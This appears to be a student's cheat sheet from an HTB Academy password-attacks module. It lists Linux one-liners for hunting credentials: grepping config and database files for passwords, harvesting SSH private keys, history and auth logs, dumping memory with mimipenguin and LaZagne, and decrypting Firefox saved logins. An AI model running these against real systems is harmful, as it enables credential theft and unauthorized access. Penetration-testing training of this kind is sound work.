## HTB-ACADEMY (Passsword attacks / Linux)
## Ivan Medina
---

### Credential Hunting in Linux

##### **Files**

##### *Configuration Files*

```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

##### *Credentials in Configuration Files*

```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```

##### *Databases*

```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```

##### *Notes*

```find /home/* -type f -name "*.txt" -o ! -name "*.*"```

##### *Scripts*

```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```

##### *Cronjobs*

```cat /etc/crontab```
```ls -la /etc/cron.*/```

##### *SSH Keys*

**SSH Private Keys**

```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```

**SSH Public Keys**

```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```

##### *History*

**Bash History**

```tail -n5 /home/*/.bash*```

**Logs**

```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```

##### **Memory Cache**

##### *Memory - Mimipenguin*

```sudo python3 mimipenguin.py```

##### *Memory - LaZagne*

```sudo python2.7 laZagne.py all```

##### **Browsers**

##### *Firefox Stored Credentials*

```ls -l .mozilla/firefox/ | grep default```

```cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .```

##### *Decrypting Firefox Credentials*

```python3.9 firefox_decrypt.py```

##### *Browsers - LaZagne*

```python3 laZagne.py browsers```

### Passwd, Shadow & Opasswd 
